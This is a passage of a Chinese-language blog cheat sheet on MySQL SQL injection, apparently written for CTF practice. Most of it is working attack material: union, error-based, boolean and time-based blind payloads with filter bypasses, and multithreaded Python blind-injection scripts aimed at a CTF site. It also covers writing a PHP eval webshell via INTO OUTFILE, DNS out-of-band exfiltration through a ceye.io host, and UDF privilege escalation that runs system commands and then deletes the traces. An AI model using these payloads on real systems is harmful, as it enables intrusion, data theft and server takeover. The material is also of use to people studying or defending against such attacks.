1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+id=1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;flag&#x27; --+id=1&#x27; union select 1,group_concat(flag),3 from table.flag --+ 0x02 报错注入（union被waf或者没有数据回显）fuzz报错函数有没有被waf:floor() extractvalue() updatexml() geometrycollection() multipoint()polygon() multipolygon() linestring() multilinestring() exp()payload: 12345678910select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));select * from test where id=1 and polygon((select * from(select * from(select user())a)b));select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));select * from test where id=1 and linestring((select * from(select * from(select user())a)b));select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));select * from test where id=1 and exp(~(select * from(select user())a)); 0X03 bool盲注（正确和错误两种结果）字符串截取函数: 1substr(substring),left,right,mid 123select left((select username from test limit 0,1),2) = &#x27;ad&#x27;; /*不能截取单个字符*/select substr((select username from test limit 1 offset 0)from 1 for 1) = &#x27;a&#x27;; /*绕过逗号过滤*/select mid((select username from test limit 1 offset 0)from 1 for 1) = &#x27;a&#x27;; 上脚本，两种思路1） 123regexp、rlike /*正则 ^和$表示匹配字符串的开头和结尾*/like /*不用%和等号一个效果*/= 缺陷 .可以匹配任意字符 当字典迭代到.的时候匹配一定成功 单字符被waf并且匹配的字符串里面有这个单字符的时候比较尴尬 默认不区分大小写字母，需用binary辨别为大写还是小写 2）二分法 结合ascii或者ord或者hex或者char 1234select hex(substring(database(),1,1)) = 74; /*从十进制的32到127的16进制*/select ascii(substring(database(),1,1)) = 116;select ord(substring(database(),1,1)) = 116;select substring(database(),1,1) = char(116); 一个丑陋的盲注脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python3# -*- coding: utf-8 -*-import requestsdef payload(rawstr): newstr = rawstr.replace(&#x27; &#x27;, chr(0x09)).replace(&#x27;or&#x27;, &#x27;Or&#x27;) # 必须用chr 把16进制转化成字符&#x27;\\t&#x27; return newstrurl = &#x27;http://ctf5.shiyanbar.com/web/earnest/index.php&#x27;ses = requests.session()true_state = &#x27;You are in&#x27;# databasei = 1raw = &quot;0&#x27; or length(database())=%d or &#x27;0&quot;while 1: rawpay = raw % (i) data = &#123;&#x27;id&#x27;: payload(rawpay)&#125; txt = ses.post(url, data=data).content.decode() if true_state in txt: break i += 1 if i &gt; 100: print(&#x27;length error!&#x27;)print(&quot;database.length:: %d&quot; % (i))length = istr = &#x27;&#x27;raw = &quot;0&#x27; or (select ascii(mid( (select database() limit 1 offset 0) from %d)) &gt; %d) or &#x27;0&quot; # 可以不用forfor i in range(length): i += 1 min = 31 max = 126 &#x27;&#x27;&#x27; min和max各自代表ascii可打印字符的上限和下限 &#x27;&#x27;&#x27; while 1: rawpay = raw % (i, (min + max) // 2) data = &#123;&#x27;id&#x27;: payload(rawpay)&#125; txt = ses.post(url, data=data).content.decode() if true_state in txt: if (max - (min + max) // 2) == 1: asc = max str += chr(asc) print(str) break else: min = (max + min) // 2 else: max = (max + min) // 2print(&quot;database::%s&quot; % (str)) 上面的脚本由于题目网络问题跑的有点慢，所以我加上了多线程, 速度提升明显，只是脚本依然丑陋 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#! /usr/bin/env python# -*- coding: utf-8 -*-from concurrent.futures import ThreadPoolExecutorimport requests, queuedef payload(rawstr): newstr = rawstr.replace(&#x27; &#x27;, chr(0x09)).replace(&#x27;or&#x27;, &#x27;Or&#x27;) # 必须用chr 把16进制转化成字符&#x27;\\t&#x27; return newstrurl = &#x27;http://ctf5.shiyanbar.com/web/earnest/index.php&#x27;ses = requests.session()true_state = &#x27;You are in&#x27;# databasei = 1raw = &quot;0&#x27; or length(database())=%d or &#x27;0&quot;while 1: print(i) rawpay = raw % i data = &#123;&#x27;id&#x27;: payload(rawpay)&#125; txt = ses.post(url, data=data).content.decode() if true_state in txt: break i += 1 if i &gt; 100: print(&#x27;length error! please check your payload!&#x27;)print(&quot;database.length:: %d&quot; % (i))q = queue.Queue(0)length = idef sqli(i): min = 31 max = 126 raw = &quot;0&#x27; or (select ascii(mid( (select database() limit 1 offset 0) from %d)) &gt; %d) or &#x27;0&quot; # 可以不用for while 1: rawpay = raw % (i, (min + max) // 2) data = &#123;&#x27;id&#x27;: payload(rawpay)&#125; txt = ses.post(url, data=data).content.decode() if true_state in txt: if (max - (min + max) // 2) == 1: asc = max q.put((i, chr(asc))) break else: min = (max + min) // 2 else: max = (max + min) // 2# threads startthreads = []with ThreadPoolExecutor(10) as executor: executor.map(sqli,range(1, length+1))#get resultresult = []while not q.empty(): result.append(q.get())#sortdef get_zero(ele): return ele[0]result.sort(key = get_zero)str = &#x27;&#x27;for i in range(len(result)): str += result[i][1]print(&quot;database::%s&quot; % (str)) 位运算符和算术运算符注入(and or 被waf死) payload: 12345678select id from test where id = &#x27;0&#x27;^(select(ascii(mid(database(),1,1))&gt;1))^&#x27;0&#x27;; /*括号绕过空格*/select id from test where id = &#x27;0&#x27;xor(select(ascii(mid(database(),1,1))&gt;1))xor&#x27;0&#x27;;select id from test where id = &#x27;0&#x27;|(select(ascii(mid(database(),1,1))&gt;1))|&#x27;0&#x27;;select id from test where id = &#x27;1&#x27;&amp;(select(ascii(mid(database(),1,1))&gt;1))&amp;&#x27;1&#x27;;select id from test where id = &#x27;0&#x27;+(select(ascii(mid(database(),1,1))&gt;1))+&#x27;0&#x27;;select id from test where id = &#x27;1&#x27;-(select(ascii(mid(database(),1,1))&gt;1))-&#x27;0&#x27;;select id from test where id = &#x27;1&#x27;*(select(ascii(mid(database(),1,1))&gt;1))*&#x27;1&#x27;;select id from test where id = &#x27;1&#x27;/(select(ascii(mid(database(),1,1))&gt;1))/&#x27;1&#x27;; 直接查询同一张表的字段 1&#x27;0&#x27;^(select(ascii(mid((select(passwd))from(%d)))&gt;%d))^&#x27;1&#x27; /*uname和passwd是同一张表的两个字段*/ 0x04 时间盲注（只有一种返回结果）延迟：sleep,benchmark,heavy query（利用information_schema里的表做笛卡尔积运算，返回时间不稳定） 1234select if(2&gt;1, sleep(2), 1);select if(2&gt;1, benchmark(1e7,md5(1)), 1);select if(2&gt;1, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C), 1);/*时间由columns的数量和服务器处理器性能等决定*/ 过滤了逗号 1select case when 2&gt;1 then sleep(2) else 1 end; payload构造的时候注意and和or的短路性，sleep函数是否会被执行 12345678910111213141516mysql&gt; select id from test where id = &#x27;1&#x27; and sleep(2);Empty set (2.01 sec)mysql&gt; select id from test where id = &#x27;0&#x27; and sleep(2);Empty set (0.00 sec)mysql&gt; select id from test where id = &#x27;1&#x27; or sleep(2);+------+| id |+------+| 1 |+------+1 row in set (2.01 sec)mysql&gt; select id from test where id = &#x27;0&#x27; or sleep(2);Empty set (4.03 sec) /*不是很理解这个细节 后面的order by注入也有这个问题*/ 绕过上学期看的一篇绕过的总结，比较基础 宽字节注入（转义单引号）%bf匹配低位\\，低位的范围中要含有0x5c编码再加一个\\构成\\’ 使单引号逃逸 sprintf逃逸单引号在php里sprintf进行拼接的时候%后的内容为格式化类型，如果没有这个类型会输出空 123456789&lt;?php$input1 = &quot;admin%1$&#x27; and 1=1#&quot;;$input2 = &quot;&quot;;$input1 = addslashes($input1);$input2 = addslashes($input2);$sql = &quot;select * from %s where username = &#x27;$input1&#x27; and password=&#x27;$input2&#x27;;&quot;;echo sprintf( $sql, &quot;user&quot;) ;//select * from user where username = &#x27;admin&#x27; and 1=1#&#x27; and password=&#x27;&#x27;;?&gt; sprintf格式化字符串带来的注入隐患 load_file和outfilemysql常见的系统函数和变量123user() 用户名,current_user 当前用户名,session_user() 连接数据库的用户名@@hostname 主机名,@@port 数据库端口,version() mysql数据库版本@@version_compile_os 操作系统,@@datadir 数据库绝对路径,@@basedir mysql绝对路径 测试读写权限 1and(select count(*) from mysql.user)&gt;0 --+ 常见用途可以用来写一句话木马 1234id = -1 union select load_file (&#x27;C:/1.bmp&#x27;) into outfile &#x27;C:/PHPstudy/WWW/1.php&#x27; /*结合文件上传*/id = -1 union select &#x27;&lt;?php @eval($_post[cmd])?&gt;&#x27; into outfile &#x27;C:/PHPstudy/WWW/1.php&#x27;/*直接写*/id = -1 union select 0x3c3f70687020406576616c28245f706f73745b636d645d293f3e into outfile &#x27;C:/PHPstudy/WWW/2.php&#x27;/*一句话可以换成16进制 outfile只能加单引号*/ 如果想用load_file查看文件，特别是exe等可以00截断或者有回车换行的二进制文件时，最好用hex函数然后再转换回来，这样就不存在截断了 1id = -1 union select hex(load_file(&#x27;C:/1.exe&#x27;)) outfile和dumpfile区别 select * from admin into outfile ‘&#x2F;1.txt’; 可以完整导出每一行记录 而dumpfile只能导出一行数据 对于2进制文件，只能用dumpfile导出，它不对任何列或行进行终止，也不执行任何转义处理 其余操作update,insert,re头,cookie注入与数据库有交互且用户可以控制的地方都可能存在注入demo 1234insert into test values(&#x27;aa&#x27;, &#x27;&#x27; or (extractvalue(1,concat(0x7e,(select user()),0x7e))) or &#x27;&#x27;, &#x27;3&#x27;); /*报错*/insert into test values(&#x27;aa&#x27;, &#x27;&#x27; or (select if(2&gt;1, sleep(1), 1)) or &#x27;&#x27;,&#x27;3&#x27;);/*时间盲注*/update test set name = &#x27;&#x27;or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or&#x27;&#x27; where id = 3;update test set name = &#x27;&#x27;or (select if (2&gt;1,sleep(1), 1)) or&#x27;&#x27; where id =1; 二次注入从数据库取出的数据完全信任，在存进数据库的时候注入恶意代码 在注册账号时可以恶意注入一些sql语句 然后在重置密码的时候没有对已经在数据库的数据进行过滤导致可以在没有密码的情况下恶意修改某些账号的密码 比如这样可以注册admin’#的账户来修改admin的密码 1update users set password = &#x27;&amp;pass&#x27; where username = &#x27;admin&#x27; #&#x27; and password = &#x27;$curr_pass&#x27; 强网杯在注入点只允许注册数字 用16进制绕过 1234567891011121314mysql&gt; insert into demo values(&#x27;root&#x27;, 0x312d3520756e696f6e2073656c65637420312c322c33,4);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from demo;+-------+------------------------+------+| name | password | id |+-------+------------------------+------+| admin | admin888 | 1 || user1 | pass2 | 2 || user2 | pass3 | 3 || root | 1-5 union select 1,2,3 | 4 |+-------+------------------------+------+4 rows in set (0.00 sec) 取出数据库里的内容后再进行拼接，1-5&#x3D;-4已经不是字段里面可以弱类型的内容了所以不会显示而显示后面union select的内容 1234567mysql&gt; select * from demo where password = 1-5 union select 1,2,3;+------+----------+------+| name | password | id |+------+----------+------+| 1 | 2 | 3 |+------+----------+------+1 row in set, 4 warnings (0.00 sec) hpf http分割注入 where子句后执行任意不存在函数可以爆出数据库 12mysql&gt; select id from test where id = 1 and www();ERROR 1305 (42000): FUNCTION test.www does not exist 要求同时比对username和password 各自限制一部分 1$SQL = &quot;select * from test where username=&#x27;$input1&#x27; and password = &#x27;$input2&#x27;&quot;; payload: 12username= 1&#x27; and updatexml/*&amp;password=*/(1,concat(0x7e,(select database()),0x7e),1) and &#x27;1select * from test where username=&#x27;1&#x27; and updatexml/*&#x27; and password = &#x27;*/(1,concat(0x7e,(select database()),0x7e),1) and &#x27;1&#x27; 已知表名不知字段名直接爆数据思想是通过选取派生表让我们的字段名可控，然后联合查询表里的所有内容 1234567891011121314151617181920212223242526272829303132333435363738394041424344mysql&gt; select * from (select 1)a join (select 2)b join (select 3)c; /*用join连接绕过逗号*/+---+---+---+| 1 | 2 | 3 |+---+---+---+| 1 | 2 | 3 |+---+---+---+1 row in set (0.00 sec)mysql&gt; select * from (select 1)a join (select 2)b join (select 3)c union select * from test; /*引入test表*/+-------+-------+------+| 1 | 2 | 3 |+-------+-------+------+| 1 | 2 | 3 || admin | admin | 1 || root | root | 2 |+-------+-------+------+3 rows in set (0.00 sec)mysql&gt; select d.2 from (select * from (select 1)a join (select 2)b join (select3)c union select * from test)d limit 1 offset 1;/*将上面的结果再作为一个派生表，用d.2和limit,offset访问字段的内容*/+-------+| 2 |+-------+| admin |+-------+1 row in set (0.00 sec)mysql&gt; select * from test where id = -1 union select (select d.2 from (select *from (select 1)a join (select 2)b join (select 3)c union select * from test)d limit 1 offset 1), (select 0)e, (select 0)f;+-------+----------+------+| name | password | id |+-------+----------+------+| admin | 0 | 0 |+-------+----------+------+1 row in set (0.00 sec)/*也可以用盲注*/mysql&gt; select * from test where id = 1 and length((select d.2 from (select * from (select 1)a join (select 2)b join (select 3)c union select * from test)d limit 1 offset 1)) &gt; 1;+-------+----------+------+| name | password | id |+-------+----------+------+| admin | admin | 1 |+-------+----------+------+1 row in set (0.00 sec) limit 注入mysql select语句执行顺序原文404了，引用一下别人的吧mysql 5.x的select语法 1234567891011121314151617181920SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [WHERE where_condition] [GROUP BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ...] [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE &#x27;file_name&#x27; export_options | INTO DUMPFILE &#x27;file_name&#x27; | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] mysql中在order by前面可以使用union关键字 1234567891011mysql&gt; select * from test where id &gt; 0 limit 1 union select 1,2,3 from test order by 1;+-------+----------+------+| name | password | id |+-------+----------+------+| 1 | 2 | 3 || admin | admin | 1 |+-------+----------+------+2 rows in set (0.00 sec)mysql&gt; select * from test where id &gt; 0 order by 1 limit 1 union select 1,2,3 from test;ERROR 1221 (HY000): Incorrect usage of UNION and ORDER BY 用procedure analyse进行报错注入 123456mysql&gt; select * from test where id &gt; 0 order by 1 limit 1 procedure analyse(updatexml(1,concat(0x7e,version(),0x7e),1),1);ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.53~&#x27;mysql&gt; select * from test where id &gt; 0 order by 1 limit 1 procedure analyse(updatexml(1,concat(0x7e,(select version()),0x7e),1),1);ERROR 1064 (42000): You have an error in your SQL syntax; check the manual thatcorresponds to your MySQL server version for the right syntax to use near &#x27;select version()),0x7e),1),1)&#x27; at line 1 但是这里面解析不了select子句，Daedalus说是mysql版本问题，玩不了了 order by 注入报错 12mysql&gt; select id from test order by 1 and updatexml(1,concat(0x7e,(select user()),0x7e),1);ERROR 1105 (HY000): XPATH syntax error: &#x27;~root@localhost~&#x27; 时间盲注 12345678mysql&gt; select id from test order by (select if (1=1, sleep(1), 1) );+------+| id |+------+| 1 || 2 |+------+2 rows in set (2.03 sec) 返回时间有几秒就说明有几个数据，可以调整一下sleep的时间 mysql 带外注入UNC(Universal Naming Convention)UNC为网络（主要指局域网）上资源的完整 Windows 2000 名称格式为：\\servername\\sharename\\directory\\filenamemysql的load_file函数支持这种路径格式来加载外部文件，所以只能适用于windows的操作系统 原理如果本地hosts文件和本地dns解析器都没有与域名对应的映射关系，则会去查找本地dns服务器，如果本地DNS服务器本地区域文件与缓存解析都失效，且本地DNS服务器未用转发模式，本地DNS就把请求发至13台根DNS，然后按照上图依次查询。 payload12345678910mysql&gt; SELECT CONCAT(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.qlcegs.ceye.io\\\\abc.txt&#x27;);+---------------------------------------------------------------+| CONCAT(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.qlcegs.ceye.io\\\\abc.txt&#x27;) |+---------------------------------------------------------------+| \\\\security.qlcegs.ceye.io\\abc.txt |+---------------------------------------------------------------+1 row in set (0.00 sec)/*前一个反斜线起转义作用*/mysql&gt; SELECT load_file(CONCAT(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.qlcegs.ceye.io\\\\abc.txt&#x27;)); 在dns上看到的效果： mysql udf提权dll在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。 plugin在mysql版本&gt;5.1时，udf要求导出到mysql&#x2F;lib&#x2F;plugin目录下，且默认不存在可以使用ads流创建文件夹 123select &#x27;lib&#x27; into dumpfile &#x27;E:\\\\phpStudy\\\\PHPTutorial\\\\MySQL\\\\lib::$INDEX_ALLOCATION&#x27;;select &#x27;plugin&#x27; into dumpfile &#x27;E:\\\\phpStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$INDEX_ALLOCATION&#x27;;/*自己实验失败 errcode 13 没找到解决方法*/ 创建函数可以用webshell创建plugin目录后找任意的地方上传udf.dll文件再导出到plugin目录创建函数，必须有数据库insert权限，因为操作会在mysql.func系统表中添加一行记录 12select load_file(&quot;C:/phpStudy/PHPTutorial/WWW/udf.dll&quot;) into dumpfile &#x27;C/phpStudy/PHPTutorial/MySQL/lib/plugin/udf.dll&#x27;;create function shell returns string soname &#x27;udf.dll&#x27;; 没有webshell或者上传业务的话可以这样做 123select hex(load_file(&#x27;c:/udf.dll&#x27;)); /*得到dll的16进制*/select unhex(&#x27;udf.dll hex code&#x27;) into dumpfile &#x27;C/phpStudy/PHPTutorial/MySQL/lib/plugin/udf.dll&#x27;;create function shell returns string soname &#x27;udf.dll&#x27;; 随后就可以来执行系统命令，还可以擦除痕迹 123select shell(&quot;cmd&quot;,&quot;net user&quot;);drop function shell;delete from mysql.func where name = &#x27;shell&#x27;;","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://0xr1ngs.github.io/tags/sqli/"}]}],"categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"},{"name":"Crypto","slug":"Crypto","permalink":"https://0xr1ngs.github.io/categories/Crypto/"},{"name":"CTF","slug":"CTF","permalink":"https://0xr1ngs.github.io/categories/CTF/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://0xr1ngs.github.io/tags/Java/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://0xr1ngs.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"cbc","slug":"cbc","permalink":"https://0xr1ngs.github.io/tags/cbc/"},{"name":"xss","slug":"xss","permalink":"https://0xr1ngs.github.io/tags/xss/"},{"name":"sqli","slug":"sqli","permalink":"https://0xr1ngs.github.io/tags/sqli/"},{"name":"csrf","slug":"csrf","permalink":"https://0xr1ngs.github.io/tags/csrf/"},{"name":"xxe","slug":"xxe","permalink":"https://0xr1ngs.github.io/tags/xxe/"},{"name":"文件上传","slug":"文件上传","permalink":"https://0xr1ngs.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]}